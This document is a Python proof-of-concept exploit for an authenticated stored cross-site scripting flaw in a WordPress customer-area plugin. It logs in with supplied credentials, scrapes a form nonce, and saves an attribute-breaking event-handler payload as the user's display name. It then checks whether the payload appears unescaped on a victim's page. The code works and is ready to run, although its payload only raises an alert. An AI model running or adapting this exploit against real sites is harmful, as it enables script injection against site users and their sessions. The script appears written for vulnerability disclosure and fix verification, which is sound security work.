#!/usr/bin/env python3
"""PoC for Authenticated Stored XSS via display_name.

Chain:
  SAVE: POST customer-account-edit (cuar_form_id + cuar_customer-account-edit_nonce)
        -> CUAR_SimpleField::persist() (no sanitize) -> wp_update_user(display_name)
        -> WP core pre_user_display_name keeps `"` (ENT_NOQUOTES), strips `<>`.
  SINK: post-owner-link-usr.template.php title="...raw..." / widget authors title.

Usage:
  python3 poc.py --url=<private-content-URL> [--user=attacker --password=secret]
                 [--account-edit=<account-edit-URL>] [--login-url=<wp-login-URL>]

Only stdlib is used.
"""
import argparse
import http.cookiejar
import os
import re
import sys
import urllib.parse
import urllib.request

PAYLOAD = 'test" tabindex=0 autofocus onfocus=alert(document.domain) x="'
SLUG = "customer-account-edit"
NONCE_FIELD = f"cuar_{SLUG}_nonce"


def build_opener():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.addheaders = [("User-Agent", "Mozilla/5.0 POC")]
    return opener


def http_get(opener, url):
    with opener.open(url, timeout=20) as r:
        return r.url, r.read().decode("utf-8", errors="ignore")


def http_post(opener, url, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body)
    with opener.open(req, timeout=20) as r:
        return r.url, r.read().decode("utf-8", errors="ignore")


def wp_login(opener, login_url, user, password):
    # Prime cookies (testcookie).
    try:
        http_get(opener, login_url)
    except Exception:
        pass
    data = {
        "log": user,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": login_url.replace("wp-login.php", "wp-admin/"),
        "testcookie": "1",
    }
    final_url, html = http_post(opener, login_url, data)
    if "wp-admin" in final_url or "Log Out" in html or "log-out" in html:
        return True
    # Fallback heuristic: login form gone.
    if 'name="log"' not in html and 'name="pwd"' not in html:
        return True
    return False


def find_account_edit(opener, base, explicit):
    if explicit:
        return explicit
    guess = base.rstrip("/") + "/customer-account-edit/"
    try:
        _, html = http_get(opener, guess)
        if NONCE_FIELD in html:
            return guess
    except Exception:
        pass
    raise SystemExit(
        f"[!] Could not find account-edit page at {guess}. "
        "Pass --account-edit=<URL of the 'Edit account' page>."
    )


def extract_nonce(html):
    m = re.search(
        r'name="' + re.escape(NONCE_FIELD) + r'"\s+value="([^"]+)"', html
    )
    if not m:
        m = re.search(
            r'value="([^"]+)"\s+name="' + re.escape(NONCE_FIELD) + r'"', html
        )
    return m.group(1) if m else None


def extract_input(html, name):
    m = re.search(r'name="' + re.escape(name) + r'"[^>]*value="([^"]*)"', html)
    return m.group(1) if m else ""


def main():
    ap = argparse.ArgumentParser(description="WP Customer Area 8.4.0 Stored XSS PoC")
    ap.add_argument("--url", required=True, help="Victim private content URL (owner link visible)")
    ap.add_argument("--user", default=os.environ.get("ATTACKER_USER", "attacker"))
    ap.add_argument("--password", default=os.environ.get("ATTACKER_PASS", "attacker123"))
    ap.add_argument("--account-edit", default=None)
    ap.add_argument("--login-url", default=None)
    args = ap.parse_args()

    victim_url = args.url
    parts = urllib.parse.urlparse(victim_url)
    base = f"{parts.scheme}://{parts.netloc}"
    login_url = args.login_url or (base + "/wp-login.php")

    opener = build_opener()
    print(f"[*] Login as {args.user} @ {login_url}")
    if not wp_login(opener, login_url, args.user, args.password):
        print("[!] Login failed. Check --user/--password and --login-url.")
        sys.exit(1)
    print("[+] Logged in")

    edit_url = find_account_edit(opener, base, args.account_edit)
    print(f"[*] Account-edit: {edit_url}")
    _, edit_html = http_get(opener, edit_url)
    nonce = extract_nonce(edit_html)
    if not nonce:
        print(f"[!] Nonce {NONCE_FIELD} not found. Need 'cuar_edit_account' capability.")
        sys.exit(1)

    # Keep required fields valid; only display_name carries the payload.
    data = {
        "cuar_form_id": SLUG,
        NONCE_FIELD: nonce,
        "cuar_submit": "Submit",
        "user_email": extract_input(edit_html, "user_email") or f"{args.user}@example.com",
        "user_login": extract_input(edit_html, "user_login"),
        "first_name": extract_input(edit_html, "first_name"),
        "last_name": extract_input(edit_html, "last_name"),
        "nickname": extract_input(edit_html, "nickname") or args.user,
        "display_name": PAYLOAD,
        "user_url": extract_input(edit_html, "user_url"),
        "description": extract_input(edit_html, "description"),
    }
    print(f"[*] Submitting payload as display_name: {PAYLOAD}")
    final_url, _ = http_post(opener, edit_url, data)
    if "updated=1" in final_url:
        print("[+] Saved (redirect ?updated=1)")
    else:
        print(f"[*] Save POST done, landed at: {final_url} (continuing to verify)")

    print(f"[*] Verifying sink at {victim_url}")
    _, victim_html = http_get(opener, victim_url)
    # Vulnerable: raw `"` breaks title="...", payload verbatim. Fixed: `&quot;` or stripped.
    if "tabindex=0 autofocus onfocus=alert(document.domain)" in victim_html:
        # Ensure it is in the dangerous title context, not encoded.
        m = re.search(r'title="[^"]*tabindex=0 autofocus onfocus=alert\(document\.domain\)', victim_html)
        if m:
            print("[+] VULNERABLE: raw payload reflected in title=\"...\" attribute:")
            print("    " + m.group(0)[:160])
            return
        print("[+] VULNERABLE: raw payload reflected (outside title, check context).")
        return
    if "&quot;" in victim_html and "autofocus" in victim_html:
        print("[-] Appears FIXED: payload is entity-encoded.")
    else:
        print("[-] Payload not found. Check: attacker owns content at --url, victim URL correct.")
        sys.exit(2)


if __name__ == "__main__":
    main()
